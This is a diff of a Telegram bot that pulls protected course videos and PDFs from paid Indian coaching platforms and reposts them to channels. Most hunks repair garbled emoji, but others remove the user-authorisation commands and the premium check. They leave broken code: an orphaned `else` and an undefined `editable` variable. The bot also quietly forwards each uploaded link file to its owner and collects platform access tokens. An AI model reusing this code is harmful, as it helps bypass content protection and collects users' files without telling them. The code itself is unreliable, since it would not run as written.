@@ -59,12 +59,12 @@ photozip = 'https://envs.sh/cD_.jpg'
 
 
 # Inline keyboard for start command
-BUTTONSCONTACT = InlineKeyboardMarkup([[InlineKeyboardButton(text="ðŸ“ž Contact", url="https://t.me/saini_contact_bot")]])
+BUTTONSCONTACT = InlineKeyboardMarkup([[InlineKeyboardButton(text="📞 Contact", url="https://t.me/saini_contact_bot")]])
 keyboard = InlineKeyboardMarkup(
     [
         [
-            InlineKeyboardButton(text="ðŸ› ï¸ Help", url="https://t.me/+3k-1zcJxINYwNGZl"),
-            InlineKeyboardButton(text="ðŸ› ï¸ Repo", url="https://github.com/nikhilsainiop/saini-txt-direct"),
+            InlineKeyboardButton(text="🛠️ Help", url="https://t.me/+3k-1zcJxINYwNGZl"),
+            InlineKeyboardButton(text="🛠️ Repo", url="https://github.com/nikhilsainiop/saini-txt-direct"),
         ],
     ]
 )
@@ -75,44 +75,6 @@ image_urls = [
     "https://tinypic.host/images/2025/02/07/DeWatermark.ai_1738952933236-1.png",
     # Add more image URLs as needed
 ]
-
-@bot.on_message(filters.command("addauth") & filters.private)
-async def add_auth_user_cmd(client: Client, message: Message):
-    if message.chat.id != OWNER:
-        return await message.reply_text("You are not authorized to use this command.")
-    
-    try:
-        new_user_id = int(message.command[1])
-            await message.reply_text("User ID is already authorized.")
-        else:
-            await add_auth_user(new_user_id)
-            await message.reply_text(f"âœ… User ID {new_user_id} added.")
-    except (IndexError, ValueError):
-        await message.reply_text("âŒ Please provide a valid user ID.")
-
-@bot.on_message(filters.command("users") & filters.private)
-async def list_auth_users(client: Client, message: Message):
-    if message.chat.id != OWNER:
-        return await message.reply_text("You are not authorized to use this command.")
-    
-    user_ids = await get_all_user_ids()
-    user_list = '\n'.join(map(str, user_ids)) or "No authorized users yet."
-    await message.reply_text(f"ðŸ‘¥ Authorized Users:\n{user_list}")
-
-@bot.on_message(filters.command("rmauth") & filters.private)
-async def remove_auth_user_cmd(client: Client, message: Message):
-    if message.chat.id != OWNER:
-        return await message.reply_text("You are not authorized to use this command.")
-    
-    try:
-        user_id = int(message.command[1])
-            await message.reply_text("User is not authorized.")
-        else:
-            await remove_auth_user(user_id)
-            await message.reply_text(f"âœ… User ID {user_id} removed.")
-    except (IndexError, ValueError):
-        await message.reply_text("âŒ Please provide a valid user ID.")
-    
         
 @bot.on_message(filters.command("cookies") & filters.private)
 async def cookies_handler(client: Client, m: Message):
@@ -142,11 +104,11 @@ async def cookies_handler(client: Client, m: Message):
             target_file.write(cookies_content)
 
         await input_message.reply_text(
-            "âœ… Cookies updated successfully.\nðŸ“‚ Saved in `youtube_cookies.txt`."
+            "✅ Cookies updated successfully.\n📂 Saved in `youtube_cookies.txt`."
         )
 
     except Exception as e:
-        await m.reply_text(f"âš ï¸ An error occurred: {str(e)}")
+        await m.reply_text(f"⚠️ An error occurred: {str(e)}")
 
 @bot.on_message(filters.command(["t2t"]))
 async def text_to_txt(client, message: Message):
@@ -161,7 +123,7 @@ async def text_to_txt(client, message: Message):
     text_data = input_message.text.strip()
     await input_message.delete()  # Corrected here
     
-    await editable.edit("**ðŸ”„ Send file name or send /d for filename**")
+    await editable.edit("**🔄 Send file name or send /d for filename**")
     inputn: Message = await bot.listen(message.chat.id)
     raw_textn = inputn.text
     await inputn.delete()  # Corrected here
@@ -177,7 +139,7 @@ async def text_to_txt(client, message: Message):
     with open(txt_file, 'w') as f:
         f.write(text_data)
         
-    await message.reply_document(document=txt_file, caption=f"`{custom_file_name}.txt`\n\n<blockquote>You can now download your content! ðŸ“¥</blockquote>")
+    await message.reply_document(document=txt_file, caption=f"`{custom_file_name}.txt`\n\n<blockquote>You can now download your content! 📥</blockquote>")
     os.remove(txt_file)
 
 # Define paths for uploaded file and processed file
@@ -250,11 +212,11 @@ async def youtube_to_txt(client, message: Message):
 
 @bot.on_message(filters.command(["yt2m"]))
 async def yt2m_handler(bot: Client, m: Message):
-    editable = await m.reply_text(f"ðŸ”¹**Send me the YouTube link**")
+    editable = await m.reply_text(f"🔹**Send me the YouTube link**")
     input: Message = await bot.listen(editable.chat.id)
     youtube_link = input.text.strip()
     await input.delete(True)
-    Show = f"**âš¡Dá´á´¡É´ÊŸá´á´€á´… Sá´›á´€Ê€á´›á´‡á´…...â³**\n\nðŸ”—ð”ð‘ð‹ Â»  {youtube_link}\n\nâœ¦ðð¨ð­ ðŒðšððž ðð² âœ¦ {CREDIT}ðŸ¦"
+    Show = f"**⚡Dᴏᴡɴʟᴏᴀᴅ Sᴛᴀʀᴛᴇᴅ...⏳**\n\n🔗𝐔𝐑𝐋 »  {youtube_link}\n\n✦𝐁𝐨𝐭 𝐌𝐚𝐝𝐞 𝐁𝐲 ✦ {CREDIT}🐦"
     await editable.edit(Show, disable_web_page_preview=True)
     await asyncio.sleep(10)
     try:
@@ -272,7 +234,7 @@ async def yt2m_handler(bot: Client, m: Message):
                 print(f"File {name}.mp3 exists, attempting to send...")
                 try:
                     await editable.delete()
-                    await bot.send_document(chat_id=m.chat.id, document=f'{name}.mp3', caption=f'**ðŸŽµ Title : **  {name}.mp3\n\nðŸ”—**Video link** : {url}\n\nðŸŒŸ** Extracted By** : {CREDIT}')
+                    await bot.send_document(chat_id=m.chat.id, document=f'{name}.mp3', caption=f'**🎵 Title : **  {name}.mp3\n\n🔗**Video link** : {url}\n\n🌟** Extracted By** : {CREDIT}')
                     os.remove(f'{name}.mp3')
                 except Exception as e:
                     print(f"Error sending document: {str(e)}")
@@ -284,7 +246,7 @@ async def yt2m_handler(bot: Client, m: Message):
 
 @bot.on_message(filters.command(["ytm"]))
 async def txt_handler(bot: Client, m: Message):
-    editable = await m.reply_text("ðŸ”¹**Send me the TXT file containing YouTube links.**")
+    editable = await m.reply_text("🔹**Send me the TXT file containing YouTube links.**")
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
     await bot.send_document(OWNER, x)
@@ -303,8 +265,8 @@ async def txt_handler(bot: Client, m: Message):
         os.remove(x)
         return
 
-    await m.reply_text(f"**á´›á´á´›á´€ÊŸ ðŸ”— ÊŸÉªÉ´á´‹s Ò“á´á´œÉ´á´… á´€Ê€á´‡ --__{len(links)}__--**")  
-    await editable.edit("**ðŸ”¹sá´‡É´á´… Ò“Ê€á´á´ á´¡Êœá´‡Ê€á´‡ Êá´á´œ á´¡á´€É´á´› á´›á´ á´…á´á´¡É´ÊŸá´á´€á´…**")
+    await m.reply_text(f"**ᴛᴏᴛᴀʟ 🔗 ʟɪɴᴋs ғᴏᴜɴᴅ ᴀʀᴇ --__{len(links)}__--**")  
+    await editable.edit("**🔹sᴇɴᴅ ғʀᴏᴍ ᴡʜᴇʀᴇ ʏᴏᴜ ᴡᴀɴᴛ ᴛᴏ ᴅᴏᴡɴʟᴏᴀᴅ**")
     try:
         input0: Message = await bot.listen(editable.chat.id, timeout=10)
         raw_text = input0.text
@@ -317,7 +279,7 @@ async def txt_handler(bot: Client, m: Message):
         except:
             arg = 1
 
-    await m.reply_text(f"**âš¡Dá´á´¡É´ÊŸá´á´€á´…ÉªÉ´É¢ Sá´›á´€Ê€á´›á´‡á´…...â³**")
+    await m.reply_text(f"**⚡Dᴏᴡɴʟᴏᴀᴅɪɴɢ Sᴛᴀʀᴛᴇᴅ...⏳**")
     count = int(raw_text)
     try:
         for i in range(arg-1, len(links)):  # Iterate over each link
@@ -335,7 +297,7 @@ async def txt_handler(bot: Client, m: Message):
                 if os.path.exists(f'{name}.mp3'):
                    print(f"File {name}.mp3 exists, attempting to send...")
                    try:
-                       await bot.send_document(chat_id=m.chat.id, document=f'{name}.mp3', caption=f'**ðŸŽµ Title : **  {name}.mp3\n\nðŸ”—**Video link** : {url}\n\nðŸŒŸ** Extracted By** : {CREDIT}')
+                       await bot.send_document(chat_id=m.chat.id, document=f'{name}.mp3', caption=f'**🎵 Title : **  {name}.mp3\n\n🔗**Video link** : {url}\n\n🌟** Extracted By** : {CREDIT}')
                        os.remove(f'{name}.mp3')
                    except Exception as e:
                        print(f"Error sending document: {str(e)}")
@@ -344,7 +306,7 @@ async def txt_handler(bot: Client, m: Message):
     except Exception as e:
         await m.reply_text(f"<b>Failed Reason:</b>\n<blockquote><b>{str(e)}</b></blockquote>")
     finally:
-        await m.reply_text("ðŸ•Šï¸Done BabyðŸ’ž")
+        await m.reply_text("🕊️Done Baby💞")
 
 
 m_file_path= "main.py"
@@ -358,7 +320,7 @@ async def getcookies_handler(client: Client, m: Message):
             caption="Here is the `youtube_cookies.txt` file."
         )
     except Exception as e:
-        await m.reply_text(f"âš ï¸ An error occurred: {str(e)}")     
+        await m.reply_text(f"⚠️ An error occurred: {str(e)}")     
 @bot.on_message(filters.command("mfile") & filters.private)
 async def getcookies_handler(client: Client, m: Message):
     try:
@@ -368,7 +330,7 @@ async def getcookies_handler(client: Client, m: Message):
             caption="Here is the `main.py` file."
         )
     except Exception as e:
-        await m.reply_text(f"âš ï¸ An error occurred: {str(e)}")
+        await m.reply_text(f"⚠️ An error occurred: {str(e)}")
 
 @bot.on_message(filters.command(["stop"]) )
 async def restart_handler(_, m):
@@ -381,7 +343,7 @@ async def restart_handler(_, m):
             f"__**Your User id** __- `{m.chat.id}`</blockquote>\n\n"
         )
     else:
-        await m.reply_text("ðŸš¦**STOPPED**ðŸš¦", True)
+        await m.reply_text("🚦**STOPPED**🚦", True)
         os.execl(sys.executable, sys.executable, *sys.argv)
         
 
@@ -391,66 +353,66 @@ async def start(bot, m: Message):
     mention = user.mention
     start_message = await bot.send_message(
         m.chat.id,
-        f"ðŸŒŸ Welcome {m.from_user.first_name}! ðŸŒŸ\n\n"
+        f"🌟 Welcome {m.from_user.first_name}! 🌟\n\n"
     )
 
     await asyncio.sleep(1)
     await start_message.edit_text(
-        f"ðŸŒŸ Welcome {m.from_user.first_name}! ðŸŒŸ\n\n" +
-        f"Initializing Uploader bot... ðŸ¤–\n\n"
-        f"Progress: [â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸] 0%\n\n"
+        f"🌟 Welcome {m.from_user.first_name}! 🌟\n\n" +
+        f"Initializing Uploader bot... 🤖\n\n"
+        f"Progress: [⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️⬜️] 0%\n\n"
     )
 
     await asyncio.sleep(1)
     await start_message.edit_text(
-        f"ðŸŒŸ Welcome {m.from_user.first_name}! ðŸŒŸ\n\n" +
-        f"Loading features... â³\n\n"
-        f"Progress: [ðŸŸ¥ðŸŸ¥ðŸŸ¥â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸] 25%\n\n"
+        f"🌟 Welcome {m.from_user.first_name}! 🌟\n\n" +
+        f"Loading features... ⏳\n\n"
+        f"Progress: [🟥🟥🟥⬜️⬜️⬜️⬜️⬜️⬜️⬜️] 25%\n\n"
     )
     
     await asyncio.sleep(1)
     await start_message.edit_text(
-        f"ðŸŒŸ Welcome {m.from_user.first_name}! ðŸŒŸ\n\n" +
-        f"This may take a moment, sit back and relax! ðŸ˜Š\n\n"
-        f"Progress: [ðŸŸ§ðŸŸ§ðŸŸ§ðŸŸ§ðŸŸ§â¬œï¸â¬œï¸â¬œï¸â¬œï¸â¬œï¸] 50%\n\n"
+        f"🌟 Welcome {m.from_user.first_name}! 🌟\n\n" +
+        f"This may take a moment, sit back and relax! 😊\n\n"
+        f"Progress: [🟧🟧🟧🟧🟧⬜️⬜️⬜️⬜️⬜️] 50%\n\n"
     )
 
     await asyncio.sleep(1)
     await start_message.edit_text(
-        f"ðŸŒŸ Welcome {m.from_user.first_name}! ðŸŒŸ\n\n" +
-        f"Checking subscription status... ðŸ”\n\n"
-        f"Progress: [ðŸŸ¨ðŸŸ¨ðŸŸ¨ðŸŸ¨ðŸŸ¨ðŸŸ¨ðŸŸ¨ðŸŸ¨â¬œï¸â¬œï¸] 75%\n\n"
+        f"🌟 Welcome {m.from_user.first_name}! 🌟\n\n" +
+        f"Checking subscription status... 🔍\n\n"
+        f"Progress: [🟨🟨🟨🟨🟨🟨🟨🟨⬜️⬜️] 75%\n\n"
     )
 
     await asyncio.sleep(1)
         await start_message.edit_text(
-            f"ðŸŒŸ Welcome {m.from_user.first_name}! ðŸŒŸ\n\n" +
+            f"🌟 Welcome {m.from_user.first_name}! 🌟\n\n" +
             f"Great! You are a premium member!\n"
-            f"Use Command : /help to get started ðŸŒŸ\n\n"
+            f"Use Command : /help to get started 🌟\n\n"
             f"If you face any problem contact -  [{CREDIT}](https://t.me/saini_contact_bot)\n", disable_web_page_preview=True, reply_markup=BUTTONSCONTACT
         )
     else:
         await asyncio.sleep(2)
         await start_message.edit_text(
-           f" ðŸŽ‰ Welcome {m.from_user.first_name} to DRM Bot! ðŸŽ‰\n\n"
-           f"You can have access to download all Non-DRM+AES Encrypted URLs ðŸ” including\n\n"
-           f"Use Command : /help to get started ðŸŒŸ\n\n"
-           f"<blockquote>â€¢ ðŸ“š Appx Zip+Encrypted Url\n"
-           f"â€¢ ðŸŽ“ Classplus DRM+ NDRM\n"
-           f"â€¢ ðŸ§‘â€ðŸ« PhysicsWallah DRM\n"
-           f"â€¢ ðŸ“š CareerWill + PDF\n"
-           f"â€¢ ðŸŽ“ Khan GS\n"
-           f"â€¢ ðŸŽ“ Study Iq DRM\n"
-           f"â€¢ ðŸš€ APPX + APPX Enc PDF\n"
-           f"â€¢ ðŸŽ“ Vimeo Protection\n"
-           f"â€¢ ðŸŽ“ Brightcove Protection\n"
-           f"â€¢ ðŸŽ“ Visionias Protection\n"
-           f"â€¢ ðŸŽ“ Zoom Video\n"
-           f"â€¢ ðŸŽ“ Utkarsh Protection(Video + PDF)\n"
-           f"â€¢ ðŸŽ“ All Non DRM+AES Encrypted URLs\n"
-           f"â€¢ ðŸŽ“ MPD URLs if the key is known (e.g., Mpd_url?key=key XX:XX)</blockquote>\n\n"
-           f"ðŸš€ You are not subscribed to any plan yet!\n\n"
-           f"<blockquote>ðŸ’µ Monthly Plan: free</blockquote>\n\n"
+           f" 🎉 Welcome {m.from_user.first_name} to DRM Bot! 🎉\n\n"
+           f"You can have access to download all Non-DRM+AES Encrypted URLs 🔐 including\n\n"
+           f"Use Command : /help to get started 🌟\n\n"
+           f"<blockquote>• 📚 Appx Zip+Encrypted Url\n"
+           f"• 🎓 Classplus DRM+ NDRM\n"
+           f"• 🧑‍🏫 PhysicsWallah DRM\n"
+           f"• 📚 CareerWill + PDF\n"
+           f"• 🎓 Khan GS\n"
+           f"• 🎓 Study Iq DRM\n"
+           f"• 🚀 APPX + APPX Enc PDF\n"
+           f"• 🎓 Vimeo Protection\n"
+           f"• 🎓 Brightcove Protection\n"
+           f"• 🎓 Visionias Protection\n"
+           f"• 🎓 Zoom Video\n"
+           f"• 🎓 Utkarsh Protection(Video + PDF)\n"
+           f"• 🎓 All Non DRM+AES Encrypted URLs\n"
+           f"• 🎓 MPD URLs if the key is known (e.g., Mpd_url?key=key XX:XX)</blockquote>\n\n"
+           f"🚀 You are not subscribed to any plan yet!\n\n"
+           f"<blockquote>💵 Monthly Plan: free</blockquote>\n\n"
            f"If you want to buy membership of the bot, feel free to contact the Bot Admin.\n", disable_web_page_preview=True, reply_markup=keyboard
     )
 
@@ -458,24 +420,24 @@ async def start(bot, m: Message):
 async def id_command(client, message: Message):
     chat_id = message.chat.id
     await message.reply_text(
-        f" ðŸŽ‰ Welcome {message.from_user.first_name} to DRM Bot! ðŸŽ‰\n\n"
-           f"You can have access to download all Non-DRM+AES Encrypted URLs ðŸ” including\n\n"
-           f"Use Command : /help to get started ðŸŒŸ\n\n"
-           f"<blockquote>â€¢ ðŸ“š Appx Zip+Encrypted Url\n"
-           f"â€¢ ðŸŽ“ Classplus DRM+ NDRM\n"
-           f"â€¢ ðŸ§‘â€ðŸ« PhysicsWallah DRM\n"
-           f"â€¢ ðŸ“š CareerWill + PDF\n"
-           f"â€¢ ðŸŽ“ Khan GS\n"
-           f"â€¢ ðŸŽ“ Study Iq DRM\n"
-           f"â€¢ ðŸš€ APPX + APPX Enc PDF\n"
-           f"â€¢ ðŸŽ“ Vimeo Protection\n"
-           f"â€¢ ðŸŽ“ Brightcove Protection\n"
-           f"â€¢ ðŸŽ“ Visionias Protection\n"
-           f"â€¢ ðŸŽ“ Zoom Video\n"
-           f"â€¢ ðŸŽ“ Utkarsh Protection(Video + PDF)\n"
-           f"â€¢ ðŸŽ“ All Non DRM+AES Encrypted URLs\n"
-           f"â€¢ ðŸŽ“ MPD URLs if the key is known (e.g., Mpd_url?key=key XX:XX)</blockquote>\n\n"
-           f"<b>ðŸ’µ Monthly Plan: free</b>\n\n"
+        f" 🎉 Welcome {message.from_user.first_name} to DRM Bot! 🎉\n\n"
+           f"You can have access to download all Non-DRM+AES Encrypted URLs 🔐 including\n\n"
+           f"Use Command : /help to get started 🌟\n\n"
+           f"<blockquote>• 📚 Appx Zip+Encrypted Url\n"
+           f"• 🎓 Classplus DRM+ NDRM\n"
+           f"• 🧑‍🏫 PhysicsWallah DRM\n"
+           f"• 📚 CareerWill + PDF\n"
+           f"• 🎓 Khan GS\n"
+           f"• 🎓 Study Iq DRM\n"
+           f"• 🚀 APPX + APPX Enc PDF\n"
+           f"• 🎓 Vimeo Protection\n"
+           f"• 🎓 Brightcove Protection\n"
+           f"• 🎓 Visionias Protection\n"
+           f"• 🎓 Zoom Video\n"
+           f"• 🎓 Utkarsh Protection(Video + PDF)\n"
+           f"• 🎓 All Non DRM+AES Encrypted URLs\n"
+           f"• 🎓 MPD URLs if the key is known (e.g., Mpd_url?key=key XX:XX)</blockquote>\n\n"
+           f"<b>💵 Monthly Plan: free</b>\n\n"
            f"If you want to buy membership of the bot, feel free to contact the Bot Admin.\n", disable_web_page_preview=True, reply_markup=BUTTONSCONTACT
     )  
 
@@ -488,14 +450,14 @@ async def id_command(client, message: Message):
 async def info(bot: Client, update: Message):
     
     text = (
-        f"â•­â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•®\n"
-        f"â”‚âœ¨ **Your Telegram Info**âœ¨ \n"
-        f"â”œâ”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€\n"
-        f"â”œðŸ”¹**Name :** `{update.from_user.first_name} {update.from_user.last_name if update.from_user.last_name else 'None'}`\n"
-        f"â”œðŸ”¹**User ID :** @{update.from_user.username}\n"
-        f"â”œðŸ”¹**TG ID :** `{update.from_user.id}`\n"
-        f"â”œðŸ”¹**Profile :** {update.from_user.mention}\n"
-        f"â•°â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â•¯"
+        f"╭────────────────╮\n"
+        f"│✨ **Your Telegram Info**✨ \n"
+        f"├────────────────\n"
+        f"├🔹**Name :** `{update.from_user.first_name} {update.from_user.last_name if update.from_user.last_name else 'None'}`\n"
+        f"├🔹**User ID :** @{update.from_user.username}\n"
+        f"├🔹**TG ID :** `{update.from_user.id}`\n"
+        f"├🔹**Profile :** {update.from_user.mention}\n"
+        f"╰────────────────╯"
     )
     
     await update.reply_text(        
@@ -507,34 +469,34 @@ async def info(bot: Client, update: Message):
 @bot.on_message(filters.command(["help"]))
 async def txt_handler(client: Client, m: Message):
     await bot.send_message(m.chat.id, text= (
-        f"ðŸ’¥ ððŽð“ð’ ð‚ðŽðŒðŒð€ððƒð’\n"
-        f"â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°\n" 
-        f"ðŸ“Œ ð— ð—®ð—¶ð—» ð—™ð—²ð—®ð˜ð˜‚ð—¿ð—²ð˜€:\n\n"  
-        f"âž¥ /start â€“ Bot Status Check\n"
-        f"âž¥ /drm â€“ Extract from .txt (Auto)\n"
-        f"âž¥ /y2t â€“ YouTube â†’ .txt Converter\n"  
-        f"âž¥ /ytm â€“ YT .txt â†’ .mp3 downloader\n"  
-        f"âž¥ /yt2m â€“ YT link â†’ .mp3 downloader\n"  
-        f"âž¥ /t2t â€“ Text â†’ .txt Generator\n" 
-        f"âž¥ /stop â€“ Cancel Running Task\n"
-        f"â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–° \n" 
-        f"âš™ï¸ ð—§ð—¼ð—¼ð—¹ð˜€ & ð—¦ð—²ð˜ð˜ð—¶ð—»ð—´ð˜€: \n\n" 
-        f"âž¥ /cookies â€“ Update YT Cookies\n" 
-        f"âž¥ /id â€“ Get Chat/User ID\n"  
-        f"âž¥ /info â€“ User Details\n"  
-        f"âž¥ /logs â€“ View Bot Activity\n"
-        f"â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°\n"
-        f"ðŸ‘¤ ð”ð¬ðžð« ð€ð®ð­ð¡ðžð§ð­ð¢ðœðšð­ð¢ð¨ð§: **(OWNER)**\n\n" 
-        f"âž¥ /addauth xxxx â€“ Add User ID\n" 
-        f"âž¥ /rmauth xxxx â€“ Remove User ID\n"  
-        f"âž¥ /users â€“ Total User List\n"  
-        f"â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°â–°\n"
-        f"ðŸ’¡ ð—¡ð—¼ð˜ð—²:\n\n"  
-        f"â€¢ Send any link for auto-extraction\n"  
-        f"â€¢ Supports batch processing\n\n"  
-        f"â•­â”€â”€â”€â”€â”€â”€â”€â”€âŠ°â—†âŠ±â”€â”€â”€â”€â”€â”€â”€â”€â•®\n"   
-        f" âž  ðŒðšððž ðð² : {CREDIT} ðŸ’»\n"
-        f"â•°â”€â”€â”€â”€â”€â”€â”€â”€âŠ°â—†âŠ±â”€â”€â”€â”€â”€â”€â”€â”€â•¯\n"
+        f"💥 𝐁𝐎𝐓𝐒 𝐂𝐎𝐌𝐌𝐀𝐍𝐃𝐒\n"
+        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n" 
+        f"📌 𝗠𝗮𝗶𝗻 𝗙𝗲𝗮𝘁𝘂𝗿𝗲𝘀:\n\n"  
+        f"➥ /start – Bot Status Check\n"
+        f"➥ /drm – Extract from .txt (Auto)\n"
+        f"➥ /y2t – YouTube → .txt Converter\n"  
+        f"➥ /ytm – YT .txt → .mp3 downloader\n"  
+        f"➥ /yt2m – YT link → .mp3 downloader\n"  
+        f"➥ /t2t – Text → .txt Generator\n" 
+        f"➥ /stop – Cancel Running Task\n"
+        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰ \n" 
+        f"⚙️ 𝗧𝗼𝗼𝗹𝘀 & 𝗦𝗲𝘁𝘁𝗶𝗻𝗴𝘀: \n\n" 
+        f"➥ /cookies – Update YT Cookies\n" 
+        f"➥ /id – Get Chat/User ID\n"  
+        f"➥ /info – User Details\n"  
+        f"➥ /logs – View Bot Activity\n"
+        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
+        f"👤 𝐔𝐬𝐞𝐫 𝐀𝐮𝐭𝐡𝐞𝐧𝐭𝐢𝐜𝐚𝐭𝐢𝐨𝐧: **(OWNER)**\n\n" 
+        f"➥ /addauth xxxx – Add User ID\n" 
+        f"➥ /rmauth xxxx – Remove User ID\n"  
+        f"➥ /users – Total User List\n"  
+        f"▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰▰\n"
+        f"💡 𝗡𝗼𝘁𝗲:\n\n"  
+        f"• Send any link for auto-extraction\n"  
+        f"• Supports batch processing\n\n"  
+        f"╭────────⊰◆⊱────────╮\n"   
+        f" ➠ 𝐌𝐚𝐝𝐞 𝐁𝐲 : {CREDIT} 💻\n"
+        f"╰────────⊰◆⊱────────╯\n"
         )
     )                    
           
@@ -542,18 +504,15 @@ async def txt_handler(client: Client, m: Message):
 async def send_logs(client: Client, m: Message):  # Correct parameter name
     try:
         with open("logs.txt", "rb") as file:
-            sent = await m.reply_text("**ðŸ“¤ Sending you ....**")
+            sent = await m.reply_text("**📤 Sending you ....**")
             await m.reply_document(document=file)
             await sent.delete()
     except Exception as e:
         await m.reply_text(f"Error sending logs: {e}")
 
 @bot.on_message(filters.command(["drm"]) )
-async def txt_handler(bot: Client, m: Message):  
-            print(f"User ID not in AUTH_USERS", m.chat.id)
-            await bot.send_message(m.chat.id, f"<blockquote>__**Oopss! You are not a Premium member\nPLEASE /upgrade YOUR PLAN\nSend me your user id for authorization\nYour User id**__ - `{m.chat.id}`</blockquote>\n")
-            return
-    editable = await m.reply_text(f"**__Hii, I am non-drm Downloader Bot__\n<blockquote><i>Send Me Your text file which enclude Name with url...\nE.g: Name: Link\n</i></blockquote>\n<blockquote><i>All input auto taken in 20 sec\nPlease send all input in 20 sec...\n</i></blockquote>**")
+async def txt_handler(bot: Client, m: Message):
+           await m.reply_text(f"**__Hii, I am non-drm Downloader Bot__\n<blockquote><i>Send Me Your text file which enclude Name with url...\nE.g: Name: Link\n</i></blockquote>\n<blockquote><i>All input auto taken in 20 sec\nPlease send all input in 20 sec...\n</i></blockquote>**")
     input: Message = await bot.listen(editable.chat.id)
     x = await input.download()
     await bot.send_document(OWNER, x)
@@ -601,11 +560,11 @@ async def txt_handler(bot: Client, m: Message):
                     other_count += 1
         os.remove(x)
     except:
-        await m.reply_text("<b>ðŸ”¹Invalid file input.</b>")
+        await m.reply_text("<b>🔹Invalid file input.</b>")
         os.remove(x)
         return
     
-    await editable.edit(f"**Total ðŸ”— links found are {len(links)}\n<blockquote>â€¢PDF : {pdf_count}      â€¢V2 : {v2_count}\nâ€¢Img : {img_count}      â€¢YT : {yt_count}\nâ€¢zip : {zip_count}       â€¢m3u8 : {m3u8_count}\nâ€¢drm : {drm_count}      â€¢Other : {other_count}\nâ€¢mpd : {mpd_count}</blockquote>\nSend From where you want to download**")
+    await editable.edit(f"**Total 🔗 links found are {len(links)}\n<blockquote>•PDF : {pdf_count}      •V2 : {v2_count}\n•Img : {img_count}      •YT : {yt_count}\n•zip : {zip_count}       •m3u8 : {m3u8_count}\n•drm : {drm_count}      •Other : {other_count}\n•mpd : {mpd_count}</blockquote>\nSend From where you want to download**")
     try:
         input0: Message = await bot.listen(editable.chat.id, timeout=20)
         raw_text = input0.text
@@ -614,9 +573,9 @@ async def txt_handler(bot: Client, m: Message):
         raw_text = '1'
     
     if int(raw_text) > len(links) :
-        await editable.edit(f"**ðŸ”¹Enter number in range of Index (01-{len(links)})**")
+        await editable.edit(f"**🔹Enter number in range of Index (01-{len(links)})**")
         processing_request = False  # Reset the processing flag
-        await m.reply_text("**ðŸ”¹Exiting Task......  **")
+        await m.reply_text("**🔹Exiting Task......  **")
         return
         
     await editable.edit(f"**Enter Batch Name or send /d**")
@@ -674,7 +633,7 @@ async def txt_handler(bot: Client, m: Message):
     else:
         CR = raw_text3
 
-    await editable.edit("**Enter __PW/CP/CW__ Working Token For ðŒððƒ ð”ð‘ð‹ or send /d**")
+    await editable.edit("**Enter __PW/CP/CW__ Working Token For 𝐌𝐏𝐃 𝐔𝐑𝐋 or send /d**")
     try:
         input4: Message = await bot.listen(editable.chat.id, timeout=20)
         raw_text4 = input4.text
@@ -706,7 +665,7 @@ async def txt_handler(bot: Client, m: Message):
     else:
         thumb = raw_text6
 
-    await editable.edit("__**âš ï¸Provide the Channel ID or send /d__\n\n<blockquote><i>ðŸ”¹ Make me an admin to upload.\nðŸ”¸Send /id in your channel to get the Channel ID.\n\nExample: Channel ID = -100XXXXXXXXXXX</i></blockquote>\n**")
+    await editable.edit("__**⚠️Provide the Channel ID or send /d__\n\n<blockquote><i>🔹 Make me an admin to upload.\n🔸Send /id in your channel to get the Channel ID.\n\nExample: Channel ID = -100XXXXXXXXXXX</i></blockquote>\n**")
     try:
         input7: Message = await bot.listen(editable.chat.id, timeout=20)
         raw_text7 = input7.text
@@ -722,18 +681,18 @@ async def txt_handler(bot: Client, m: Message):
 
     try:
         if raw_text == "1":
-            batch_message = await bot.send_message(chat_id=channel_id, text=f"<blockquote><b>ðŸŽ¯Target Batch : {b_name}</b></blockquote>")
+            batch_message = await bot.send_message(chat_id=channel_id, text=f"<blockquote><b>🎯Target Batch : {b_name}</b></blockquote>")
             if "/d" not in raw_text7:
-                await bot.send_message(chat_id=m.chat.id, text=f"<blockquote><b><i>ðŸŽ¯Target Batch : {b_name}</i></b></blockquote>\n\nðŸ”„ Your Task is under processing, please check your Set ChannelðŸ“±. Once your task is complete, I will inform you ðŸ“©")
+                await bot.send_message(chat_id=m.chat.id, text=f"<blockquote><b><i>🎯Target Batch : {b_name}</i></b></blockquote>\n\n🔄 Your Task is under processing, please check your Set Channel📱. Once your task is complete, I will inform you 📩")
                 await bot.pin_chat_message(channel_id, batch_message.id)
                 message_id = batch_message.id
                 pinning_message_id = message_id + 1
                 await bot.delete_messages(channel_id, pinning_message_id)
         else:
              if "/d" not in raw_text7:
-                await bot.send_message(chat_id=m.chat.id, text=f"<blockquote><b><i>ðŸŽ¯Target Batch : {b_name}</i></b></blockquote>\n\nðŸ”„ Your Task is under processing, please check your Set ChannelðŸ“±. Once your task is complete, I will inform you ðŸ“©")
+                await bot.send_message(chat_id=m.chat.id, text=f"<blockquote><b><i>🎯Target Batch : {b_name}</i></b></blockquote>\n\n🔄 Your Task is under processing, please check your Set Channel📱. Once your task is complete, I will inform you 📩")
     except Exception as e:
-        await m.reply_text(f"**Fail Reason Â»**\n<blockquote><i>{e}</i></blockquote>\n\nâœ¦ðð¨ð­ ðŒðšððž ðð² âœ¦ {CREDIT}ðŸŒŸ`")
+        await m.reply_text(f"**Fail Reason »**\n<blockquote><i>{e}</i></blockquote>\n\n✦𝐁𝐨𝐭 𝐌𝐚𝐝𝐞 𝐁𝐲 ✦ {CREDIT}🌟`")
 
         
     failed_count = 0
